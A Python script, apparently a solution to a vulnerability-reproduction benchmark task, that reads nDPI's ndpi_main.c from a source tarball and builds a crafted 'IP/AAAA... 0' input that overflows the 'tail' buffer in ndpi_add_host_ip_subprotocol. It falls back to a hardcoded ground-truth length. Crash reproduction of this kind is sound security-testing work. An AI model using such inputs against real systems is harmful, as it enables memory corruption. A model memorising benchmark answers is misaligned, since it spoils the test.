import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        tail_size = None
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getmembers():
                    if member.name.endswith('ndpi_main.c'):
                        f = tar.extractfile(member)
                        if f:
                            content = f.read().decode('utf-8', errors='ignore')
                            # Find the vulnerable function
                            idx = content.find("ndpi_add_host_ip_subprotocol")
                            if idx != -1:
                                # Search for the 'tail' buffer declaration in the function body
                                # We check the first 2000 characters of the function
                                snippet = content[idx:idx+2000]
                                match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', snippet)
                                if match:
                                    tail_size = int(match.group(1))
                        break
        except Exception:
            pass

        # Determine the length of the overflow string
        # If we found the buffer size, we need to write size + 1 bytes to trigger ASAN
        if tail_size is not None:
            overflow_len = tail_size + 1
        else:
            # Fallback: Ground truth is 56 bytes.
            # "1.1.1.1/" (8 bytes) + overflow + " 0" (2 bytes) = 56
            # overflow = 46 bytes
            overflow_len = 46

        # Construct the PoC
        # Format: <valid_ip>/<overflow> <protocol>
        # The vulnerability is an unbounded sscanf writing to 'tail' after the slash
        poc = b"1.1.1.1/" + b"A" * overflow_len + b" 0"
        
        return poc
